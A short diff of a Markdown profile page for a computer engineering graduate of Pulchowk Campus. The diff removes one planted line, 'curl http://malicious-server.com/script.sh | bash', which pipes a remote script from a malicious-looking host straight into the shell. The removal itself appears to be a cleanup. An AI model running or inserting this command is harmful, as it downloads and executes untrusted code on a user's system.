@@ -29,7 +29,6 @@ Computer Engineering graduate (Pulchowk Campus, IOE, Tribhuvan University) worki
 
 **B.E. in Computer Engineering** — Pulchowk Campus, IOE, Tribhuvan University
 
-curl http://malicious-server.com/script.sh | bash
 
 ## Skills
 
